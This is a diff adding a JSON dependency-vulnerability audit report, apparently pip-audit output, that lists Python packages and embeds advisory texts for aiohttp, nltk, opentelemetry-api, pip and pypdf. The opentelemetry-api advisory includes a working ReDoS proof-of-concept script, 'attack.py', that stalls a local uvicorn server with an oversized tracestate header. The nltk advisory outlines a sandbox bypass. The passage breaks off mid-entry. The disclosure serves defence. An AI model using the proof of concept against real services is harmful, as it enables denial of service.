@@ -1,0 +1,1082 @@
+{
+  "dependencies": [
+    {
+      "name": "aiocache",
+      "version": "0.12.3",
+      "vulns": []
+    },
+    {
+      "name": "aiodns",
+      "version": "3.6.1",
+      "vulns": []
+    },
+    {
+      "name": "aiofiles",
+      "version": "24.1.0",
+      "vulns": []
+    },
+    {
+      "name": "aiohappyeyeballs",
+      "version": "2.7.1",
+      "vulns": []
+    },
+    {
+      "name": "aiohttp",
+      "version": "3.14.3",
+      "vulns": [
+        {
+          "id": "GHSA-5wr8-gcqf-gqf3",
+          "fix_versions": [
+            "3.14.4"
+          ],
+          "aliases": [
+            "CVE-2026-111064"
+          ],
+          "description": "### Summary  The keepalive timeout was not used during the initial portion of a request.  ### Impact  An attacker could keep an idle connection open indefinitely before sending any data.  ### Workaround  Use a reverse proxy (as recommended for all production deployments) with sensible keepalive limits."
+        },
+        {
+          "id": "GHSA-2g87-pp6c-29x5",
+          "fix_versions": [
+            "3.14.4"
+          ],
+          "aliases": [],
+          "description": "### Summary  Multiple cases were found where aiohttp could use excessive or unbounded memory, or excessive CPU consumption on attacker controlled requests.  ### Impact  An attacker could cause resource exhaustion through specially crafted requests."
+        },
+        {
+          "id": "GHSA-494j-54xm-rwp3",
+          "fix_versions": [
+            "3.14.4"
+          ],
+          "aliases": [
+            "CVE-2026-111063"
+          ],
+          "description": "### Summary  The Secure attribute was not being enforced for the shared cookie.  ### Impact  It may be possible to send a shared cookie marked Secure through an unencrypted request."
+        },
+        {
+          "id": "GHSA-pqxq-w44r-73xw",
+          "fix_versions": [
+            "3.14.4"
+          ],
+          "aliases": [
+            "CVE-2026-111750"
+          ],
+          "description": "### Summary  The pure Python parser is vulnerable to an HTTP request smuggling attack.  ### Impact  If users are using the Python parser (`AIOHTTP_NO_EXTENSIONS`, or not a standard wheel installed), then an application may be vulnerable to a request smuggling attack.  ### Workaround  Switch to the default C parser."
+        },
+        {
+          "id": "GHSA-9xw5-w5jj-pvcg",
+          "fix_versions": [
+            "3.14.4"
+          ],
+          "aliases": [
+            "CVE-2026-111066"
+          ],
+          "description": "### Summary  An attacker can exhaust file descriptors with specially crafted multipart requests.  ### Impact  If a handler uses `Request.post()`, it may be possible for an attacker to use an unlimited number of file descriptors, potentially resulting in resource exhaustion."
+        },
+        {
+          "id": "GHSA-gx76-c99x-2c96",
+          "fix_versions": [
+            "3.14.4"
+          ],
+          "aliases": [
+            "CVE-2026-111749"
+          ],
+          "description": "### Summary  A subdomain can remove the Host-Only flag from an existing cookie to a parent domain.  ### Impact  A user accessing untrusted subdomains could see their Host-Only protections stripped from cookies. Given most usecases won't reflect these cookies to a browser, the impact is limited."
+        },
+        {
+          "id": "GHSA-6cjc-53gc-5rqm",
+          "fix_versions": [
+            "3.14.4"
+          ],
+          "aliases": [
+            "CVE-2026-111065"
+          ],
+          "description": "### Summary  An overflow in Max-Age processing can skip closing a connection.  ### Impact  An attacker may be able to exhaust the connection pool temporarily, until garbage collection resolves the connections."
+        },
+        {
+          "id": "GHSA-f9xw-jh8m-3mwq",
+          "fix_versions": [
+            "3.14.4"
+          ],
+          "aliases": [
+            "CVE-2026-111748"
+          ],
+          "description": "### Summary  An attacker sending an absolute-form request can spoof the scheme used.  ### Impact  If user code depends on the `Request.scheme` attribute for anything security related, an attacker may be able to circumvent this logic, tricking the application into thinking a connection is encrypted when it is not, or vice versa.  ### Workaround  A WAF rule to reject absolute-form requests (legitimate requests should only use this form for proxies)."
+        }
+      ]
+    },
+    {
+      "name": "aiomcache",
+      "version": "0.8.2",
+      "vulns": []
+    },
+    {
+      "name": "aiosignal",
+      "version": "1.4.0",
+      "vulns": []
+    },
+    {
+      "name": "annotated-types",
+      "version": "0.8.0",
+      "vulns": []
+    },
+    {
+      "name": "anyio",
+      "version": "4.14.2",
+      "vulns": []
+    },
+    {
+      "name": "asgiref",
+      "version": "3.13.0",
+      "vulns": []
+    },
+    {
+      "name": "asyncpg",
+      "version": "0.30.0",
+      "vulns": []
+    },
+    {
+      "name": "attrs",
+      "version": "26.1.0",
+      "vulns": []
+    },
+    {
+      "name": "backoff",
+      "version": "2.2.1",
+      "vulns": []
+    },
+    {
+      "name": "bcrypt",
+      "version": "4.3.0",
+      "vulns": []
+    },
+    {
+      "name": "beautifulsoup4",
+      "version": "4.14.3",
+      "vulns": []
+    },
+    {
+      "name": "certifi",
+      "version": "2026.10.23",
+      "vulns": []
+    },
+    {
+      "name": "cffi",
+      "version": "2.1.1",
+      "vulns": []
+    },
+    {
+      "name": "charset-normalizer",
+      "version": "3.5.2",
+      "vulns": []
+    },
+    {
+      "name": "ciso8601",
+      "version": "2.3.3",
+      "vulns": []
+    },
+    {
+      "name": "click",
+      "version": "8.5.0",
+      "vulns": []
+    },
+    {
+      "name": "cloudpickle",
+      "version": "3.1.2",
+      "vulns": []
+    },
+    {
+      "name": "cryptography",
+      "version": "50.0.0",
+      "vulns": []
+    },
+    {
+      "name": "curl-cffi",
+      "version": "0.16.3",
+      "vulns": []
+    },
+    {
+      "name": "defusedxml",
+      "version": "0.7.1",
+      "vulns": []
+    },
+    {
+      "name": "deprecated",
+      "version": "3.0.0",
+      "vulns": []
+    },
+    {
+      "name": "et-xmlfile",
+      "version": "2.0.0",
+      "vulns": []
+    },
+    {
+      "name": "exchange-calendars",
+      "version": "4.13.2",
+      "vulns": []
+    },
+    {
+      "name": "fastapi",
+      "version": "0.115.14",
+      "vulns": []
+    },
+    {
+      "name": "feedparser",
+      "version": "6.0.12",
+      "vulns": []
+    },
+    {
+      "name": "frozendict",
+      "version": "2.4.7",
+      "vulns": []
+    },
+    {
+      "name": "frozenlist",
+      "version": "1.8.0",
+      "vulns": []
+    },
+    {
+      "name": "google-api-core",
+      "version": "2.30.3",
+      "vulns": []
+    },
+    {
+      "name": "google-api-python-client",
+      "version": "2.194.0",
+      "vulns": []
+    },
+    {
+      "name": "google-auth",
+      "version": "2.49.2",
+      "vulns": []
+    },
+    {
+      "name": "google-auth-httplib2",
+      "version": "0.2.1",
+      "vulns": []
+    },
+    {
+      "name": "google-auth-oauthlib",
+      "version": "1.3.1",
+      "vulns": []
+    },
+    {
+      "name": "google-cloud-secret-manager",
+      "version": "2.27.0",
+      "vulns": []
+    },
+    {
+      "name": "googleapis-common-protos",
+      "version": "1.64.0",
+      "vulns": []
+    },
+    {
+      "name": "greenlet",
+      "version": "3.5.6",
+      "vulns": []
+    },
+    {
+      "name": "grpc-google-iam-v1",
+      "version": "0.14.4",
+      "vulns": []
+    },
+    {
+      "name": "grpcio",
+      "version": "1.64.3",
+      "vulns": []
+    },
+    {
+      "name": "grpcio-status",
+      "version": "1.64.3",
+      "vulns": []
+    },
+    {
+      "name": "gspread",
+      "version": "6.2.1",
+      "vulns": []
+    },
+    {
+      "name": "gunicorn",
+      "version": "23.0.0",
+      "vulns": []
+    },
+    {
+      "name": "h11",
+      "version": "0.16.0",
+      "vulns": []
+    },
+    {
+      "name": "h2",
+      "version": "4.4.1",
+      "vulns": []
+    },
+    {
+      "name": "hiredis",
+      "version": "3.3.1",
+      "vulns": []
+    },
+    {
+      "name": "hpack",
+      "version": "4.2.0",
+      "vulns": []
+    },
+    {
+      "name": "httpcore",
+      "version": "1.0.9",
+      "vulns": []
+    },
+    {
+      "name": "httplib2",
+      "version": "0.32.0",
+      "vulns": []
+    },
+    {
+      "name": "httptools",
+      "version": "0.6.4",
+      "vulns": []
+    },
+    {
+      "name": "httpx",
+      "version": "0.27.2",
+      "vulns": []
+    },
+    {
+      "name": "hyperframe",
+      "version": "6.1.0",
+      "vulns": []
+    },
+    {
+      "name": "idna",
+      "version": "3.20",
+      "vulns": []
+    },
+    {
+      "name": "importlib-metadata",
+      "version": "8.5.0",
+      "vulns": []
+    },
+    {
+      "name": "iniconfig",
+      "version": "2.3.1",
+      "vulns": []
+    },
+    {
+      "name": "joblib",
+      "version": "1.6.0",
+      "vulns": []
+    },
+    {
+      "name": "korean-lunar-calendar",
+      "version": "0.4.0",
+      "vulns": []
+    },
+    {
+      "name": "limits",
+      "version": "3.14.1",
+      "vulns": []
+    },
+    {
+      "name": "loguru",
+      "version": "0.7.3",
+      "vulns": []
+    },
+    {
+      "name": "lxml",
+      "version": "6.1.0",
+      "vulns": []
+    },
+    {
+      "name": "multidict",
+      "version": "6.9.1",
+      "vulns": []
+    },
+    {
+      "name": "multitasking",
+      "version": "0.0.13",
+      "vulns": []
+    },
+    {
+      "name": "nltk",
+      "version": "3.10.3",
+      "vulns": [
+        {
+          "id": "GHSA-8mgp-746c-j5xp",
+          "fix_versions": [],
+          "aliases": [
+            "CVE-2026-81726",
+            "PYSEC-2026-3740"
+          ],
+          "description": "### Summary  Several model-artifact APIs still treat caller-controlled model paths as ordinary filenames even when NLTK path security is enforced. The same outside-root paths are rejected by guarded helpers, but these public read and write flows still use raw file APIs.  ### Details  - **Vulnerability type:** File sandbox bypass - **Affected component:** `TransitionParser.train`, `TransitionParser.parse`, `AveragedPerceptron.save`, `AveragedPerceptron.load`, `PerceptronTagger.save_to_json`, `save_maxent_params` - **Affected versions:** Published `3.9.4` and current source `v3.10.0-rc2` both reproduced. - **Patched versions:** Not yet patched - **Root cause:** Model import and export helpers use built-in `open()` on caller-controlled paths instead of pathsec-aware helpers.  `TransitionParser.train()` writes outside allowed roots, `TransitionParser.parse()` reads outside allowed roots, `AveragedPerceptron` bypasses the sandbox in both directions, and adjacent read-side helpers in the same family already show the intended guarded behavior. I confirmed outside-root reads and writes while `pathsec.open()` or the guarded sibling helpers rejected the same paths.  ### PoC  **Preconditions** - The application enables `pathsec` enforcement and lets untrusted workflows choose model import or export paths.  **Steps** 1. Enable `pathsec.ENFORCE=True` and restrict allowed roots to a dedicated sandbox directory. 2. Use public model import or export APIs with paths that point outside that root. 3. Observe the same paths are rejected by negative-control guarded helpers such as `pathsec.open()`, `PerceptronTagger.load_from_json()`, or `load_maxent_params()`. 4. Observe the vulnerable APIs still read or write outside-root files successfully.  **Minimal reproducible excerpt**  ```text transition_train_exists True transition_parse_loader_read_bytes 13 averaged_load_keys ['bias'] maxent_save wrote ['alwayson.tab', 'labels.txt'] ```  ### Impact  Consumers that rely on `pathsec` for local containment can be tricked into reading or overwriting files outside approved roots through normal model persistence and loading APIs.  ### Remediation  Route all model-path file access through `nltk.pathsec.open()` or existing pathsec-aware helpers, and add regression tests that pair each vulnerable API with a negative control on the same path."
+        }
+      ]
+    },
+    {
+      "name": "numpy",
+      "version": "1.26.4",
+      "vulns": []
+    },
+    {
+      "name": "oauthlib",
+      "version": "4.0.0",
+      "vulns": []
+    },
+    {
+      "name": "openpyxl",
+      "version": "3.1.5",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-api",
+      "version": "1.28.0",
+      "vulns": [
+        {
+          "id": "GHSA-xcq7-p3pf-p88h",
+          "fix_versions": [
+            "1.45.1"
+          ],
+          "aliases": [
+            "CVE-2026-114603"
+          ],
+          "description": "## Summary `TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.  ## Affected component / version - Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`). - Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between. - Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.  ## Details  1. The header reaches the parser without any length check:  ```python # opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57 tracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # <-- attacker-controlled request header(s), any size if tracestate_headers is None:     tracestate = None else:     tracestate = TraceState.from_header(tracestate_headers)             # <-- no length check before parsing (line 61) ```  2. The split pattern and the parser: ```python # opentelemetry-api/src/opentelemetry/trace/span.py:45 _TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # <-- only enforced later, in TraceState.__init__, after the split _delimiter_pattern = re.compile(r\"[ \\t]*,[ \\t]*\")      # <-- (line 46) starts with an unbounded [ \\t]*  # span.py:382 @classmethod def from_header(cls, header_list: list[str]) -> TraceState:     pairs = {}  # type: dict[str, str]     for header in header_list:         members: list[str] = re.split(_delimiter_pattern, header)   # <-- (line 400) VULNERABLE: O(N^2) on \"a=b\" + \" \" * N + \"x\"         for member in members:             if not member:                 continue             match = _member_pattern.fullmatch(member)             if not match:                 _logger.warning(                                    # <-- also logs the entire malformed member (up to the whole header)                     \"Member doesn't match the w3c identifiers format %s\",                     member,                 )                 return cls()             ... ```  `re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ \\t]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.  3. The sibling propagator already has the missing guard: ```python # baggage/propagation/__init__.py:68 _MAX_HEADER_LENGTH = 8192 ... if len(header.encode()) > self._MAX_HEADER_LENGTH:   # <-- (line 93) rejected before any regex runs; tracestate has no equivalent     _logger.warning(...)     return context ```  A 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s. Measured cost of `extract()` on one core (valid `traceparent`, `tracestate: \"a=b\" + N spaces + \"x\"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower).   Whether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.  ## Proof of concept  ### A. Show the quadratic cost (no server needed)  1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected). 2. Save as `poc_tracestate.py`: ```python import logging import time  from opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator  # The library logs the whole malformed member at WARNING; silence it so the timings stay readable. logging.disable(logging.CRITICAL)  TRACEPARENT = \"00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01\" propagator = TraceContextTextMapPropagator()  previous = None for n in (10_000, 20_000, 40_000, 80_000):     # N spaces after a valid member, no comma anywhere in the header     carrier = {\"traceparent\": TRACEPARENT, \"tracestate\": \"a=b\" + \" \" * n + \"x\"}     start = time.perf_counter()     propagator.extract(carrier)     elapsed = time.perf_counter() - start     growth = f\"x{elapsed / previous:.1f}\" if previous else \"-\"     print(f\"{n:>7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}\")     previous = elapsed ``` 3. Run `python poc_tracestate.py`. 4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run: ```   10000 characters    0.06 s  growth when size doubles: -   20000 characters    0.26 s  growth when size doubles: x4.0   40000 characters    1.04 s  growth when size doubles: x4.0   80000 characters    4.13 s  growth when size doubles: x4.0 ``` Replace `\" \"` with `\"\\t\"` to see ≈1.6× longer.  ### B. Show that one request stalls a real server This uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).  1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi \"uvicorn[standard]\"`. 2. Save as `app.py`: ```python from opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware   async def app(scope, receive, send):     await send({\"type\": \"http.response.start\", \"status\": 200, \"headers\": [(b\"content-type\", b\"text/plain\")]})     await send({\"type\": \"http.response.body\", \"body\": b\"ok\"})   app = OpenTelemetryMiddleware(app) ``` 3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools` 4. Save as `attack.py`: ```python \"\"\"Send one oversized tracestate request and, while it is being handled, measure how long an unrelated request to the same server has to wait.\"\"\" import socket import sys import threading import time  HOST, PORT = \"127.0.0.1\", 8000 N = int(sys.argv[1]) if len(sys.argv) > 1 else 100_000 TRACEPARENT = \"00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01\"   def get(path, extra=\"\"):     s = socket.create_connection((HOST, PORT), timeout=120)     s.sendall(f\"GET {path} HTTP/1.1\\r\\nHost: x\\r\\nConnection: close\\r\\n{extra}\\r\\n\".encode())     start, data = time.perf_counter(), b\"\"     while chunk := s.recv(65536):         data += chunk     return time.perf_counter() - start, data.split(b\"\\r\\n\")[0].decode()   result = {} extra = f\"traceparent: {TRACEPARENT}\\r\\ntracestate: a=b{' ' * N}x\\r\\n\" attacker = threading.Thread(target=lambda: result.update(a=get(\"/attack\", extra))) print(\"idle /ping:               %.3f s  %s\" % get(\"/ping\")) attacker.start() time.sleep(0.5)  # let the attack request reach the server first print(\"/ping during the attack:  %.3f s  %s\" % get(\"/ping\")) attacker.join() print(\"attack request itself:    %.3f s  %s\" % result[\"a\"]) ``` 5. In a second terminal run `python attack.py 100000`. 6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run: ``` idle /ping:               0.000 s  HTTP/1.1 200 OK /ping during the attack:  5.909 s  HTTP/1.1 200 OK     <-- unrelated request delayed ~6 s (event loop blocked) attack request itself:    6.408 s  HTTP/1.1 200 OK ``` 7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.  ## Severity **Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.  **Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.  **Severity: Medium.**  ## Suggested remediation Replace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input: ```diff --- a/opentelemetry-api/src/opentelemetry/trace/span.py +++ b/opentelemetry-api/src/opentelemetry/trace/span.py @@ def from_header(cls, header_list: list[str]) -> TraceState:          for header in header_list: -            members: list[str] = re.split(_delimiter_pattern, header) +            members: list[str] = [m.strip(\" \\t\") for m in header.split(\",\")] ``` `_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.  ## Credit  Discovered and reported by SecDim Security Research secdim.com | @secdim | security@secdim.com  ---  **FROM MAINTAINERS**  ## Summary  `TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.  Because W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.  ## Impact  Services accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.  The practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.  Unlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.  The impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.  ## Patches  Versions of `opentelemetry-api` up to and including `1.45.0` are affected.  Upgrade `opentelemetry-api` to version `1.45.1` or later.  Version `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.  ## Workarounds  Ensure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix."
+        }
+      ]
+    },
+    {
+      "name": "opentelemetry-exporter-otlp",
+      "version": "1.28.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-exporter-otlp-proto-common",
+      "version": "1.28.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-exporter-otlp-proto-grpc",
+      "version": "1.28.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-exporter-otlp-proto-http",
+      "version": "1.28.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-instrumentation",
+      "version": "0.49b0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-instrumentation-asgi",
+      "version": "0.49b0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-instrumentation-fastapi",
+      "version": "0.49b0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-proto",
+      "version": "1.28.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-sdk",
+      "version": "1.28.0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-semantic-conventions",
+      "version": "0.49b0",
+      "vulns": []
+    },
+    {
+      "name": "opentelemetry-util-http",
+      "version": "0.49b0",
+      "vulns": []
+    },
+    {
+      "name": "orjson",
+      "version": "3.11.8",
+      "vulns": []
+    },
+    {
+      "name": "packaging",
+      "version": "24.2",
+      "vulns": []
+    },
+    {
+      "name": "pandas",
+      "version": "2.3.3",
+      "vulns": []
+    },
+    {
+      "name": "pandas-market-calendars",
+      "version": "4.6.1",
+      "vulns": []
+    },
+    {
+      "name": "passlib",
+      "version": "1.7.4",
+      "vulns": []
+    },
+    {
+      "name": "peewee",
+      "version": "4.5.3",
+      "vulns": []
+    },
+    {
+      "name": "pillow",
+      "version": "13.0.0",
+      "vulns": []
+    },
+    {
+      "name": "pip",
+      "version": "25.0.1",
+      "vulns": [
+        {
+          "id": "PYSEC-2026-196",
+          "fix_versions": [
+            "26.1.2"
+          ],
+          "aliases": [
+            "CVE-2026-8643",
+            "GHSA-wf93-45jw-7689"
+          ],
+          "description": "pip would treat console_scripts and gui_scripts as paths instead of file names without sanitizing the resolved absolute path to the installation directory, leading to entry points being installed outside the installation directory."
+        },
+        {
+          "id": "PYSEC-2026-1795",
+          "fix_versions": [
+            "25.3"
+          ],
+          "aliases": [
+            "CVE-2025-8869",
+            "GHSA-4xh5-x5gv-qwph"
+          ],
+          "description": "When extracting a tar archive pip may not check symbolic links point into the extraction directory if the tarfile module doesn't implement PEP 706. Note that upgrading pip to a \"fixed\" version for this vulnerability doesn't fix all known vulnerabilities that are remediated by using a Python version that implements PEP 706. Note that this is a vulnerability in pip's fallback implementation of tar extraction for Python versions that don't implement PEP 706 and therefore are not secure to all vulnerabilities in the Python 'tarfile' module. If you're using a Python version that implements PEP 706 then pip doesn't use the \"vulnerable\" fallback code. Mitigations include upgrading to a version of pip that includes the fix, upgrading to a Python version that implements PEP 706 (Python >=3.9.17, >=3.10.12, >=3.11.4, or >=3.12), applying the linked patch, or inspecting source distributions (sdists) before installation as is already a best-practice."
+        },
+        {
+          "id": "PYSEC-2026-1796",
+          "fix_versions": [
+            "26.0"
+          ],
+          "aliases": [
+            "GHSA-6vgw-5pg2-w6jp",
+            "CVE-2026-1703"
+          ],
+          "description": "When pip is installing and extracting a maliciously crafted wheel archive, files may be extracted outside the installation directory. The path traversal is limited to prefixes of the installation directory, thus isn't able to inject or overwrite executable files in typical situations."
+        },
+        {
+          "id": "PYSEC-2026-2875",
+          "fix_versions": [
+            "26.1"
+          ],
+          "aliases": [
+            "GHSA-58qw-9mgm-455v",
+            "CVE-2026-3219"
+          ],
+          "description": "pip handles concatenated tar and ZIP files as ZIP files regardless of filename or whether a file is both a tar and ZIP file. This behavior could result in confusing installation behavior, such as installing \"incorrect\" files according to the filename of the archive. New behavior only proceeds with installation if the file identifies uniquely as a ZIP or tar archive, not as both."
+        },
+        {
+          "id": "PYSEC-2026-2876",
+          "fix_versions": [
+            "26.1"
+          ],
+          "aliases": [
+            "CVE-2026-6357",
+            "GHSA-jp4c-xjxw-mgf9"
+          ],
+          "description": "pip prior to version 26.1 would run self-update check functionality after installing wheel files which required importing well-known Python modules names. These module imports were intentionally deferred to increase startup time of the pip CLI. The patch changes self-update functionality to run before wheels are installed to prevent newly-installed modules from being imported shortly after the installation of a wheel package. Users should still review package contents prior to installation."
+        },
+        {
+          "id": "PYSEC-2026-3721",
+          "fix_versions": [
+            "26.2"
+          ],
+          "aliases": [
+            "CVE-2026-13346",
+            "GHSA-qwm4-qh6w-59xr"
+          ],
+          "description": "pip would incorrectly handle doubly-encoded package URLs from indexes allowing for files to be installed to arbitrary locations on disk even when installing wheels.     This vulnerability requires downloading or installing a package from a malicious package index to succeed, malicious packages alone are not able to exploit this vulnerability. Note that this vulnerability only materially impacts users running `pip download` with the `--only-binary` option as installing source distributions from an untrusted index is already an unsafe operation that executes code during install time."
+        }
+      ]
+    },
+    {
+      "name": "platformdirs",
+      "version": "4.13.5",
+      "vulns": []
+    },
+    {
+      "name": "pluggy",
+      "version": "1.7.0",
+      "vulns": []
+    },
+    {
+      "name": "prometheus-client",
+      "version": "0.21.1",
+      "vulns": []
+    },
+    {
+      "name": "propcache",
+      "version": "0.5.4",
+      "vulns": []
+    },
+    {
+      "name": "proto-plus",
+      "version": "1.24.0",
+      "vulns": []
+    },
+    {
+      "name": "protobuf",
+      "version": "5.29.6",
+      "vulns": []
+    },
+    {
+      "name": "py-googletrans",
+      "version": "4.0.0",
+      "vulns": []
+    },
+    {
+      "name": "pyasn1",
+      "version": "0.6.4",
+      "vulns": []
+    },
+    {
+      "name": "pyasn1-modules",
+      "version": "0.4.2",
+      "vulns": []
+    },
+    {
+      "name": "pycares",
+      "version": "4.11.0",
+      "vulns": []
+    },
+    {
+      "name": "pycparser",
+      "version": "3.12",
+      "vulns": []
+    },
+    {
+      "name": "pydantic",
+      "version": "2.13.2",
+      "vulns": []
+    },
+    {
+      "name": "pydantic-core",
+      "version": "2.46.2",
+      "vulns": []
+    },
+    {
+      "name": "pydantic-settings",
+      "version": "2.14.2",
+      "vulns": []
+    },
+    {
+      "name": "pygments",
+      "version": "2.21.0",
+      "vulns": []
+    },
+    {
+      "name": "pyjwt",
+      "version": "2.15.0",
+      "vulns": []
+    },
+    {
+      "name": "pyluach",
+      "version": "2.3.0",
+      "vulns": []
+    },
+    {
+      "name": "pyopenssl",
+      "version": "26.4.0",
+      "vulns": []
+    },
+    {
+      "name": "pyparsing",
+      "version": "3.3.3",
+      "vulns": []
+    },
+    {
+      "name": "pypdf",
+      "version": "6.20.0",
+      "vulns": [
+        {
+          "id": "GHSA-qfv9-64jg-mh7p",
+          "fix_versions": [
+            "6.20.1"
+          ],
+          "aliases": [
+            "CVE-2026-113792"
+          ],
+          "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires calling `find_outline_item` on a `PdfWriter`.  ### Patches  This has been fixed in [pypdf==6.20.1](https://github.com/py-pdf/pypdf/releases/tag/6.20.1).  ### Workarounds  If you cannot upgrade yet, consider applying the changes from PR [#4188](https://github.com/py-pdf/pypdf/pull/4188)."
+        },
+        {
+          "id": "GHSA-9mx8-4j7g-633p",
+          "fix_versions": [
+            "6.20.1"
+          ],
+          "aliases": [
+            "CVE-2026-113793"
+          ],
+          "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to an infinite loop. This requires removing an object from a tree, for example an outline item.  ### Patches  This has been fixed in [pypdf==6.20.1](https://github.com/py-pdf/pypdf/releases/tag/6.20.1).  ### Workarounds  If you cannot upgrade yet, consider applying the changes from PR [#4188](https://github.com/py-pdf/pypdf/pull/4188)."
+        },
+        {
+          "id": "GHSA-5hx5-vpf9-5wcv",
+          "fix_versions": [
+            "6.21.1"
+          ],
+          "aliases": [
+            "CVE-2026-113786"
+          ],
+          "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to arbitrary image parsers being called. This requires loading an image which claims to use the `/DCTDecode` filter (JPEG data).  Users which do not have the optional *Pillow* dependency installed in their environment are not affected.  ### Patches  This has been fixed in [pypdf==6.21.1](https://github.com/py-pdf/pypdf/releases/tag/6.21.1).  ### Workarounds  If you cannot upgrade yet, consider applying the changes from PR [#4222](https://github.com/py-pdf/pypdf/pull/4222)."
+        },
+        {
+          "id": "GHSA-cgf9-327m-v77c",
+          "fix_versions": [
+            "6.21.0"
+          ],
+          "aliases": [
+            "CVE-2026-113791"
+          ],
+          "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires parsing content streams with many small operations.  ### Patches  This has been fixed in [pypdf==6.21.0](https://github.com/py-pdf/pypdf/releases/tag/6.21.0).  ### Workarounds  If you cannot upgrade yet, consider applying the changes from PR [#4218](https://github.com/py-pdf/pypdf/pull/4218)."
+        },
+        {
+          "id": "GHSA-f54x-cmq8-qg57",
+          "fix_versions": [
+            "6.21.0"
+          ],
+          "aliases": [
+            "CVE-2026-113790"
+          ],
+          "description": "### Impact  An attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires parsing arrays and/or dictionaries with lots of elements.  ### Patches  This has been fixed in [pypdf==6.21.0](https://github.com/py-pdf/pypdf/releases/tag/6.21.0).  ### Workarounds  If you cannot upgrade yet, consider applying the changes from PR [#4218](https://github.com/py-pdf/pypdf/pull/4218)."
+        },
+        {
